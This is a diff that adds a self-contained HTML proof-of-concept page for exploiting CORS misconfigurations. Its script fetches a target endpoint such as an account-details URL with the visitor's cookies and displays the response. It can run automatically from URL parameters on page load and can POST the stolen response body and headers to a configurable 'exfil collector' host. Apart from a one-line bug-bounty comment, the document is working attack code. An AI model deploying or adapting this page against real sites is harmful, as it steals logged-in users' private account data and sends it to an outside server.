@@ -1,0 +1,96 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>CORS PoC (universal)</title>
+<style>
+  body{font:14px/1.5 system-ui;margin:24px}
+  pre{white-space:pre-wrap;background:#111;color:#0f0;padding:12px;border-radius:8px}
+  .muted{color:#666}
+  .err{color:#b00}
+  input[type=text]{width:700px;max-width:100%}
+</style>
+<h1>CORS PoC</h1>
+
+<p class="muted">1) Log in to the target (if needed, same browser). 2) Paste or pass the endpoint. 3) Choose cookies. 4) Run.</p>
+
+<p>
+  URL:
+  <input id="u" type="text" value="https://target.example.com/accountDetails">
+  <label><input type="checkbox" id="creds"> Use cookies</label>
+  <label><input type="checkbox" id="autorun"> Auto-run</label>
+  <br>
+  Optional exfil collector (POST): <input id="exfil" type="text" placeholder="https://your-collector.example/collect">
+  <button id="run">Run</button>
+</p>
+
+<div id="meta"></div>
+<h2>Response body</h2>
+<pre id="out">(no run yet)</pre>
+
+<script>
+const qs = new URLSearchParams(location.search);
+const $ = id => document.getElementById(id);
+$('u').value     = qs.get('target') || $('u').value;
+$('creds').checked  = qs.get('creds') === '1';
+$('autorun').checked= qs.get('autorun') === '1';
+$('exfil').value = qs.get('exfil') || '';
+
+function esc(s){return String(s).replace(/[&<>]/g, m=>({'&':'&amp;','<':'&lt;','>':'&gt;'}[m]))}
+
+async function run() {
+  const url   = $('u').value.trim();
+  const useC  = $('creds').checked;
+  const exfil = $('exfil').value.trim();
+  const out   = $('out');
+  const meta  = $('meta');
+
+  out.textContent = 'Fetching…';
+  meta.innerHTML = `<p><strong>Origin (PoC):</strong> ${esc(location.origin)}<br>
+  <strong>Target:</strong> ${esc(url)}<br>
+  <strong>Credentials:</strong> ${useC}</p>`;
+
+  try {
+    const r = await fetch(url, { credentials: useC ? 'include' : 'omit', mode: 'cors' });
+    // CORS-significant headers (may be null if not sent)
+    const acao = r.headers.get('access-control-allow-origin');
+    const acac = r.headers.get('access-control-allow-credentials');
+    const txt  = await r.text();
+
+    meta.insertAdjacentHTML('beforeend',
+      `<p><strong>ACAO:</strong> ${esc(acao)} &nbsp; <strong>ACAC:</strong> ${esc(acac)} &nbsp; <strong>Status:</strong> ${r.status}</p>`);
+
+    // Show body locally
+    out.textContent = txt;
+
+    // Optional exfil (bug bounty: only if allowed)
+    if (exfil) {
+      try {
+        await fetch(exfil, { method: 'POST', headers: {'Content-Type':'application/json'},
+          body: JSON.stringify({ target:url, origin:location.origin, credentials:useC, headers:{acao, acac, status:r.status}, body:txt })
+        });
+        meta.insertAdjacentHTML('beforeend', `<p class="muted">Exfil sent to ${esc(exfil)}</p>`);
+      } catch(e) {
+        meta.insertAdjacentHTML('beforeend', `<p class="err">Exfil failed: ${esc(e)}</p>`);
+      }
+    }
+
+    // Quick verdict banner
+    if (useC) {
+      if ((acao === location.origin) && (acac === 'true')) {
+        meta.insertAdjacentHTML('afterbegin', `<p style="color:#090"><strong>CORS READ OK (credentialed)</strong></p>`);
+      } else {
+        meta.insertAdjacentHTML('afterbegin', `<p class="err"><strong>Headers don’t prove credentialed read</strong> — check cookie/HTTPS/allowlist.</p>`);
+      }
+    } else {
+      if (acao === '*' || acao === location.origin) {
+        meta.insertAdjacentHTML('afterbegin', `<p style="color:#090"><strong>CORS READ OK (no credentials)</strong></p>`);
+      }
+    }
+  } catch (e) {
+    out.classList.add('err');
+    out.textContent = 'CORS blocked or network error: ' + e;
+  }
+}
+
+$('run').onclick = run;
+if ($('autorun').checked) run();
+</script>
